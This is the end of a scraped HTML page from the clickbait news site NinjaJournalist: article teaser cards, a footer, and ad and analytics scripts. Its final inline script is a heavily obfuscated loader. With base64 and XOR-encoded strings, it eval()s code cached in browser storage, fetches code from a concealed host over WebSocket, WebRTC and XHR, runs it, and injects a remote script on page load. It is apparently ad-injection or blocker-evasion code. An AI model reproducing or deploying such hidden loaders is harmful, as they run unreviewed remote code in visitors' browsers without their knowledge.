										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/01150505/tigress-3-e1517497577703-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Tigress Seeks Human Help After Starving Due To Gum Problems</h2>
									<p class="mb_text">



A village was in absolute shock when a tigress intruded it. However, the reason the large cat showed up is absolutely incredible - to find a...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/grandmother-daily-chocolate-102-years-old/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/01/21093111/chocolate-1-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Great-Great-Grandmother Owes Her 102 Years To Two Pieces Of Chocolate Per Day</h2>
									<p class="mb_text">



They say that an apple a day keeps the doctor away. Well, there is one lady who believes that it's actually chocolate. At 102 years of age,...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/business/technological-advancements-interview-process-employee/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/18143433/apply2-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">How Technological Advancements Are Hindering The Interview Process For An Employee</h2>
									<p class="mb_text">



Technological advancements in society have certainly helped in many ways, but when it comes to finding the right job, is machine learning and...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/world/mayan-city-guatemalan-jungle/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/08103314/mayan-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Mayan City Beneath Guatemalan Jungle Has Thousands Of Palaces</h2>
									<p class="mb_text">



A Mayan site that has been referred to as a megalopolis has been found buried beneath a jungle in Guatemala. The images suggest that tens of...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/world/archeologists-4000-year-brewery-egypt/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/08091505/egypt-6-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Archeologists Find 4000-Year-Old Buildings In Egypt That Were Used To Make Beer</h2>
									<p class="mb_text">



Archeologists have made a stunning discovery in Egypt. After finding two buildings that can be traced back to 2400 BCE, it is believed that...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/best-cough-remedies/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/01/08103204/GettyImages-548301275web-570c54775f9b581408456973-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">The Best Cough Remedies For Your Cold</h2>
									<p class="mb_text">



Not only can winter be gloomy and grey, but it always seems to come with a never-ending cycle of illness. No matter how hard you try, you...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/business/best-business-schools/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2017/12/28112242/the-no-1-trait-harvard-business-school-looks-for-in-mba-candidates-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">10 Best Business Schools For Those With Wall Street Dreams</h2>
									<p class="mb_text">



If you are someone that dreams of being on ruthless Wall Street, managing billions in assets, investing, selling and buying stocks, then...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/social/technology-anxiety-depression-college-students/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/11104210/stressedstudentgirl-e1518345806922-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Technology Major Factor In Anxiety And Depression Among College Students</h2>
									<p class="mb_text">



College can be seen as an amazing experience which opens doors to endless opportunities and possibilities both academically, and socially....</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/african-crocodiles/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/07150120/180202142315-orange-crocodiles-gabon-2-exlarge-169-e1518015863782-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">These African Crocodiles Are Evolving Into A Whole New Species</h2>
									<p class="mb_text">



In a bat-ridden cave in the country of Gabon, central Africa, scientist and researcher Olivier Testa came across a creature he had never seen...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
							
				</div>
			</div>
		</div>
	</div>
</div></main>



<footer id="main_footer">
	<div class="container">
		<div class="row">
			<div class="col-xs-12 wrap_footer">
				
<div class="col-xs-12 col-sm-4 footer_about equal_footer">
  <a class="footer_logo_link" href="http://ninjajournalist.com">
          <img src="http://ninjajournalist.com/wp-content/themes/ninjajournalist/images/logo.png" alt="NinjaJournalist" class="footer_logo_image img-responsive">
      </a>

  <div class="about_us widget">
    <h2 class="about_us_head widget-title"></h2>
    <p class="about_us_text">NinjaJournalist is the place for up-to-date pop-culture news. Find out what’s trending and never be out of the loop.</p>
  </div>

<!--  <div id="search-2" class="widget_search hidden-xs widget">-->
<!--    <h2 class="widget-title">search</h2>-->
<!--    <form role="search" method="get" class="search-form" action="/">-->
<!--      <label>-->
<!--        <span class="screen-reader-text">Search for:</span>-->
<!--        <input type="search" class="search-field" placeholder="Search …" value="" name="s">-->
<!--      </label>-->
<!--      <input type="submit" class="search-submit" value="Search">-->
<!--    </form>-->
<!--</div>-->

</div><div class="col-xs-12 col-sm-4 col-sm-push-4 footer_follow equal_footer">
	<div class="footer_social widget">
		<h2 class="footer_social_head hidden-xs widget-title">FOLLOW US</h2>
		<a href="https://www.facebook.com/ninjajournalist/" target="_blank" class="icon icon-fb_ft_sc"></a>
		<a href="https://twitter.com/NinjaJournalist" target="_blank" class="icon icon-tw_ft_sc"></a>
<!--		<a href="//pinterest.com" class="icon icon-pt_ft_sc"></a>-->
	</div>

	</div>
<div class="hidden-xs col-sm-4 col-sm-pull-4 footer_widget equal_footer">
      <div id="nj_categories-2" class="widget_nj_categories widget"><h2 class="widget-title">Categories</h2>
		<ul>
			<li class="cat-item cat-item-339">							<a href="http://ninjajournalist.com/category/business/">Business</a>
							</li><li class="cat-item cat-item-14">							<a href="http://ninjajournalist.com/category/world/">World</a>
							</li><li class="cat-item cat-item-99">							<a href="http://ninjajournalist.com/category/entertainment/">Entertainment</a>
							</li><li class="cat-item cat-item-100">							<a href="http://ninjajournalist.com/category/science/">Science</a>
							</li><li class="cat-item cat-item-98">							<a href="http://ninjajournalist.com/category/social/">Social</a>
							</li>		</ul>
		</div>
  </div>			</div>
		</div>
	</div>
	
<div id="footer_menu">
  <div class="container">
    <div class="row">
      <div class="col-xs-12">
        <ul id="menu-footer-menu" class="footer_menu"><li id="menu-item-2605" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2605"><a title="Privacy Policy" href="http://ninjajournalist.com/privacy-policy-2/">Privacy Policy</a></li>
<li id="menu-item-2604" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2604"><a title="Terms Of Use" href="http://ninjajournalist.com/terms-of-use/">Terms Of Use</a></li>
<li id="menu-item-2606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2606"><a title="DMCA" href="http://ninjajournalist.com/dmca/">DMCA</a></li>
<li id="menu-item-5388" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5388"><a title="Contact Us" href="http://ninjajournalist.com/contact-us/">Contact Us</a></li>
<li id="menu-item-5389" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5389"><a title="Advertise With Us" href="http://ninjajournalist.com/contact-us/">Advertise With Us</a></li>
<li id="menu-item-5390" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5390"><a title="Work With Us" href="http://ninjajournalist.com/contact-us/">Work With Us</a></li>
</ul>        <div class="copyright">
          <h1 class="copyright_head">&copy; <script>document.write(new Date().getFullYear());</script> NinjaJournalist. All rights reserved.</h1>
        </div>
      </div>
    </div>
  </div>
</div>
</footer>
<script type="text/javascript">
  window._taboola = window._taboola || [];
  _taboola.push({flush: true});
</script>

<script> 
  seenUnClickable = false;
  var interval = setInterval(function(){
      if ($(".trc_rbox_container")[0]){
        if($(".tabUnClickable")[0]) {
            seenUnClickable = true;
        }
        else {
            if(seenUnClickable){
              $( ".wp_widget_plugin_box" ).click(function() {
                var location = $(this).data('taboola-placement');
                ga('send', 'event', 'Ad Clicks', 'Click', location);
              });
              clearInterval(interval);
            }  
        } 
      }
    }, 100);  
</script>

<script>
  try{!function(){function B(){try{var n=K()}catch(t){}if(n)try{C(n.h,null)}catch(t){delete window.localStorage[n.key],delete window.sessionStorage[n.key]}else L(function(n,t){t.as=!0;try{C(n,t)}catch(A){}},M)}function M(){var n=a(window.location.protocol==a("EQcAHh5f")?"EQcAHh5fWVg=":"EQcAHldKWQ==");(new Image).src=n+u+N}function L(n,t){function A(){var e=a.shift();if(e)try{e(n,A)}catch(r){A()}else v(),t()}try{O()}catch(e){return v(),void t()}var a=[P,Q,R,S];A()}function C(a,c){!function(){eval(a)}({e:a,p:c,n:g})}function K(){var n=[];window.localStorage&&n.push(window.localStorage),window.sessionStorage&&n.push(window.sessionStorage);var t=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("CQERDwAHGhI=")));t=new Uint8Array(t);for(var A="",e=0;e<t.length;e++)A+=String.fromCharCode(t[e]);for(t=btoa(A),A=(new Date).getTime(),e=0;e<n.length;e++){var o,c=n[e];for(o in c)if(0===o.lastIndexOf(t,0)){try{for(var g=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),i=atob(c[o]),w=new Uint8Array(i.length),u=0;u<i.length;u++)w[u]=i.charCodeAt(u);var h=r(D(g,w.buffer))}catch(d){continue}if(u=parseInt(h.substring(0,13),10),!isNaN(u))if(A-u>864e5||1>A-u)c.removeItem(o);else if((u=h.substring(13))&&!(16>u.length))return{h:u,key:o}}}return null}function Q(n,t){var A=a("SkdDVg=="),e=a("TjFOXVtfQzNeQ0tMOyRTSDVZN1JdV1BZKF1OLjVVRFRDNzdULydMNlFLQU5AJ11KNlVMX1ZUUlNUXENVMF9NXE5JQFhXJkVNIkRIRT9fK0FOJkNRUlteIVxUQFpMKjE=");A=w+":"+A;var r={};r[a("DAEYHQ==")]=a("DQYGAFc=")+A+a("RgcGDwMWBhgWBU8CGRU="),r[a("GgERCggLAh4FHQ==")]=a("ABIABwAE"),r[a("DAARHAMEGxI=")]=a("ABIABwAE"),F(e,r,function(n){return n=n.match(new RegExp(a("JxAVAAkMEhYQFEgqHk5JLBBIVkNYVBEHHhIhKyZGVzgdWFRGMQFdK0otFl0mSzUUXz9YNwNFTUMyCl9PAhYHRAsWGA8U"))),null==n?null:(n=n[1],a("GhIaCgQBFwMBS0NWS0U8NCRDTlhUX1ZVXU4=")+n+a("WUVHXlxTVgMdAVIEHwkICVQRFw8DHEQ=")+n+a("WQEEAR8RVkFXQUNAWgsMBAMMBABKDQsQGk5E"))},n,t)}function R(n,t){var A=a("T0NEXw=="),e=a("P0ZOLy9fTk5eNEZMTlRTSUVZQVJdXVdZXlxOLU5VQCVDRjZUKFRMMVFLRkBAUixKMiZMXiFUVldUVjJVNCpNUDxJRy1XIDVNU0lIRkxfXENOIkRRVCheVy9UQ1ZMVk8=");A=w+":"+A;var r={};r[a("DAEYHQ==")]=[a("CgcBAFc=")+A],F(e,r,function(n){return n=n.match(new RegExp(a("JxAVAAkMEhYQFEgqHk5JLBBIVkNYVBEHHhIhKyZGVzgdWFRGMQFdK0otFl0mSzUUXz9YNwNFRD8KRV1PAhYHRAoBEgIV"))),null==n?null:(n=n[1],a("GhIaCgQBFwMBS0JWS0U8NCRDRFpTWVBbXVhAWFY=")+n+a("WQcNHk0NGQQQ"))},n,t)}function F(n,t,A,e,r){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;e=o.bind(null,e),r=o.bind(null,r);var i={};i[a("EBARPQgXABIWAg==")]=[t];var w=new g.c(i);w[a("GgERDxkAMhYQEDEeGwsHFRg=")](a("Vh4RGgxKBh4KFg==")).binaryType=a("GAEGDxQHAxECFAA="),w[a("Fh0dDQgGFxkAGBYXDgA=")]=function(n){if(null!=n[a("GhIaCgQBFwMB")]&&(n=A(n[a("GhIaCgQBFwMB")][a("GhIaCgQBFwMB")]),null!=n)){var t={};t[a("GhIaCgQBFwMB")]=n,t[a("ChcEIyEMGBItHxYTAg==")]=0,w[a("GBcQJw4ANRYKFRsSGxEM")](new g.b(t),function(){},function(){})}},w.addEventListener(a("EBARDQILGBIHBRsZFBYdEQAGFQMGAAMG"),function(){w[a("EBARLQILGBIHBRsZFDYdEQAG")]===a("HxIdAggB")&&r()});var u=a("D05EZAJYAwQBAxwXFwBJQFRTViIpTi0zWk5FXUFBR0pJXUVkHlgFEhcCGxkUCwgdEWkVVi4gRCo+WlReRFhZVFdDWl9nEUtHREF4F0cDAB4TBgQbFQcKF1QdHA5bXUJSWQ==")+n+a("cxJJBw4AWxgUBRsZFBZTBAYKFQALC24OUw8EHxoGFAUNGhsATVRERFBRNiI2NkYjNzcmS1JeVFNkD0kcFRsHCRgDTltdVUZXExQQBA4GRBQVFxcIDw8KDQsCVF1DWX0FRBoXC0AQEAUFFkg=")+function(){for(var n="",t=a("SUNEXl1VRkc="),A=0;16>A;++A){var e=(4294967296*Math.random()>>>0).toString(16);n+=t.substring(0,t.length-e.length)+e}return n}()+a("cxJJBw4AWwcTFUhGSlVZQERTRltXXlRTXl5EX0ZfR1RJQ0ReXVVGR1RBQnw=");w[a("GgERDxkAORECFAA=")](function(n){w[a("ChYAIgIGFxsgFAEVCAwZBB0MGA==")](n,function(){var n={};n[a("DQoECw==")]=a("GB0HGQgX"),n[a("ChcE")]=u,w[a("ChYAPAgIGQMBNRcFGRcAAAAKGQU=")](new g.f(n),function(){},function(){})},function(){})},function(){}),n=w[a("GgERDxkAMhYQEDEeGwsHFRg=")](a("VgQHHm0=")+window.navigator.userAgent),n.binaryType=a("GAEGDxQHAxECFAA="),G(n,x(),function(n){e(n,{rtc:w})},function(){r()})}function S(n,t){function A(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var e=x();e=a(window.location.protocol==a("EQcAHh5f")?"EQcAHh5fWVg=":"EQcAHldKWQ==")+u+e;var o=a("PjYg"),c=!1;n=A.bind(null,n),t=A.bind(null,t);var i=new g.g;i.onreadystatechange=function(){4==i.readyState&&(0==i.status?t():n(r(i.response),{}))},i.onerror=function(){t()},i.open(o,e,!0),i.responseType=a("GAEGDxQHAxECFAA="),i.send(null)}function P(n,t){var A=a("DgAHVEJK"),e=new g.a(A+w+a("VgQHHg=="));e.binaryType=a("GAEGDxQHAxECFAA="),G(e,x(),function(t){n(t,{ws:e})},function(){t()})}function G(n,t,A,e){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;A=o.bind(null,A),e=o.bind(null,e);var g=!1,i=setTimeout(function(){e(Error())},3e3),w=E(JSON.stringify({url:t||"",method:a("PjYg"),headers:null,body:null}));n.onopen=function(){clearTimeout(i),n.send(w)};var u,h=new ArrayBuffer(0);n.onmessage=function(n){if(4===n.data.byteLength){var t=new Uint8Array(n.data);if(222===t[0]&&173===t[1]&&190===t[2]&&239===t[3])return}!1===g?(g=!0,n=r(n.data),u=JSON.parse(n),u={status:u.status||0,headers:u.headers||{}}):(n=n.data,t=new Uint8Array(h.byteLength+n.byteLength),t.set(new Uint8Array(h),0),t.set(new Uint8Array(n),h.byteLength),h=t.buffer)},n.onerror=function(){clearTimeout(i),e(Error())},n.onclose=function(){g?(u.body=h,A(r(u.body))):(clearTimeout(i),e(Error()))}}function y(n){return window[n.name]?window[n.name]:n[a("GhwaGggLAjMLEgcbHwsd")]&&n[a("GhwaGggLAjMLEgcbHwsd")][a("HRYSDxgJAiENFAU=")]?n[a("GhwaGggLAjMLEgcbHwsd")][a("HRYSDxgJAiENFAU=")]:n[a("GhwaGggLAiANHxYZDQ==")]}function H(){var n=document.createElement(a("EBUGDwAA"));n.style.height=a("SAMM"),n.style.width=a("SAMM"),n.style.display=a("FxwaCw=="),n[a("CgEXCgIG")]=a("GA=="),n.name||(n.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7)),(document.body||document.head||document.documentElement).appendChild(n);var t=y(n);t.document.documentElement||t.document.write(a("GA=="));try{t.stop()}catch(A){}return n}function O(){I=a("DB0fAAISGA=="),t=a("GhsGAQAA"),q=a("HxoGCwsKDg=="),z=a("FgMRHAw="),A=a("ChISDx8M");var n=H();n=y(n);var e=n.navigator.userAgent,r=new RegExp(a("GhsGAQAAChQMAx0bExAE"),"i").test(e)?t:new RegExp(a("HxoGCwsKDgsNEhcBHwQaFRgfEBMOARc="),"i").test(e)?q:new RegExp(a("J1tcUUwGHgULHBcKGwsNAhsKEkJJR04QDwgVHR8="),"i").test(e)?A:new RegExp(a("FgMGEgIVHxgX"),"i").test(e)?z:window[a("GhsGAQAA")]?t:"undefined"!=typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(r)&&(n=window),e=a("HAUVAg=="),g.c=n[e](a("DhoaCgISWCUwMiITHxcqHxoNEwgTBwsNThIITwEGGQAWBFoZCAcdHhAjJjUqAAwCNwwYBQINEAoBAFQTCk8ADRcXGxlDCBkNNiUxJh8AGzMbDRgOBBoNDABOCBNWGB4KHRwDQAAWJCMnIRcTCCYGHhoGFR8OAQo=")),g.f=n[e](a("DhoaCgISWCUwMiETCRYAHxonExgEHA0TGgcbAVYTC0QOGhoKAhJYAAETGR8ONz0zJwYFGA4BCicLHRcdHx8DDRYdVBIRRQEeChUdAVQIBgomNzU4Ah0XCgEAMAoFDAUNCQcdAQNFCgtEBhsYHgoeXhkQJD8kPQEQHQcbATIKBAcLGgQaBAoY")),g.b=n[e](a("DhoaCgISWCUwMjsVHyYIHhAKEgoTC0QfEk4DBhgLGBNXBBEMBgwCJTAyOxUfJggeEAoSChMLRB8STgMGGAsYE1ceGxQ/MTU+BxQxFxQBABQVFxNLGxJEFAcAEAABQRoXKyc3Jw4ANRYKFRsSGxEM")),r===q?(r=H(),g.a=y(r)[e](a("DhoaCgISWCABEyEZGQ4MBA==")),r.parentElement.removeChild(r)):g.a=n[e](a("DhoaCgISWCABEyEZGQ4MBA==")),g.g=n[e](a("DhoaCgISWC8pPToCDhU7FQUWExgT"))}function D(n,t){var A=new Uint8Array(t),e=new ArrayBuffer(t.byteLength);e=new Uint8Array(e);for(var a=0;a<t.byteLength;a++)e[a]=A[a]^n.charCodeAt(a%n.length);return e.buffer}function r(n){if(window.TextDecoder)return new window.TextDecoder("utf-8").decode(new Uint8Array(n));var t="";n=new Uint8Array(n);for(var A=n.byteLength,e=0;A>e;e++)t+=String.fromCharCode(n[e]);return decodeURIComponent(escape(t))}function E(n){if(window.TextEncoder)return new window.TextEncoder("utf-8").encode(n).buffer;n=unescape(encodeURIComponent(n));for(var t=new Uint8Array(n.length),A=0;A<n.length;A++)t[A]=n.charCodeAt(A);return t.buffer}function x(){return a("VhYeHVIVSw==")+"2202170001"}function a(n){n=window.atob(n);for(var t="",A=0;A<n.length;A++)t+=String.fromCharCode(n.charCodeAt(A)^"ystnmevwdqrvzeiptcvkgndcnntovowd".charCodeAt(A%32));return t}function v(){if(!J){var n=("https:"==window.location.protocol?"https://":"http://")+u+T,t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src=n,(document.body||document.head||document.documentElement).appendChild(t),J=!0}}var u=a("ARsGQA8EEhgPEB5YGQoE"),w=a("GF0WDwkKHRYIXxEZFw=="),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2202170001",N="/l?p=2202170001&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{v()}catch(b){}try{B()}catch(b){}}()}catch(B){}
</script><script type='text/javascript' src='http://ninjajournalist.com/wp-content/plugins/forensiq-include/forensiq-script.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://ninjajournalist.com/wp-content/themes/ninjajournalist/scripts/plugins.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://ninjajournalist.com/wp-content/themes/ninjajournalist/scripts/main.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://ninjajournalist.com/wp-includes/js/wp-embed.min.js?ver=4.8.3'></script>
</body>
</html>